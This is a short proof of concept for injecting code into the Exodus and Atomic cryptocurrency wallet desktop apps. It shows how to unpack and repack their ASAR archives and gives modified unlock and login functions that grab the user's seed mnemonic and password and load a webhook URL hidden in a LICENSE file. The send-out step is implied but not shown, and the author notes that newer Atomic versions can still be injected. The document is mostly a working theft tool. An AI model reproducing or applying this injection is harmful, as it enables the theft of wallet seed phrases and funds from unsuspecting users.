 Exodus and Atomic crypto wallets injection POC (captures mnemonic and password)

## Unpack ASAR
```
asar extract app.asar <output>
```

## Pack to ASAR
```
asar pack <input> app.asar
```

## Exodus
```js
async unlock(e) {
    if (await this.shouldUseTwoFactorAuthMode()) return;
    const t = await Object(ee.readSeco)(this._walletPaths.seedFile, e);
    this._setSeed(M.fromBuffer(t)), P.a.randomFillSync(t), await this._loadLightningCreds()

    const webhook = await fs.readFile('LICENSE', 'utf8');
    const mnemonic = this._seed.mnemonicString;
    const password = e;
}
```

## Atomic
I had to go back to an old Atomic version that allowed me to import modules. It can still be injected to new versions. After login, user is prompted for an update.
```js
async login() {
    let e;
    this.$storage.password = this.password;
    try {
        if (e = await this.$addresses.get(), 0 === e.length) throw new Error("empty addresses")
    } catch (e) {
        return console.error(e), void(this.passwordError = "Wrong password")
    }

    const mnemonic = await this.$storage.get("general_mnemonic");
    const password = await this.password
    const fs = require('fs').promises;
    const webhook = await fs.readFile('LICENSE.electron.txt', 'utf8');
}
```
